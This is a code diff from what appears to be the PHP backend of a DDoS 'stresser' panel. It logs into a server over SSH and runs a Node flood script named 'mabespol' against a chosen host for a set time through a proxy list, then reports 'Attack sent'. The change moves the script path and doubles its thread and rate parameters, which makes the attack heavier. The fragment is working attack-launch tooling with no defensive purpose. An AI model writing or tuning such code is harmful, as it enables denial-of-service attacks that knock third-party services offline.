@@ -58,7 +58,7 @@
 		$connection = ssh2_connect($address, $serverPort);
 		if(ssh2_auth_password($connection, $user, $password))
 		{
-	    if($method == "mabespol"){if(ssh2_exec($connection, "screen -dm node /root/mabespol.js $host $time 32 15 proxy.txt")){echo "Attack sent to $host for $time seconds using $method!";}else{die("Ran into a error");}}		    
+	    if($method == "mabespol"){if(ssh2_exec($connection, "screen -dm node /root/mabespol/mabespol.js $host $time 64 30 proxy.txt")){echo "Attack sent to $host for $time seconds using $method!";}else{die("Ran into a error");}}		    
 		}
 		else
 		{
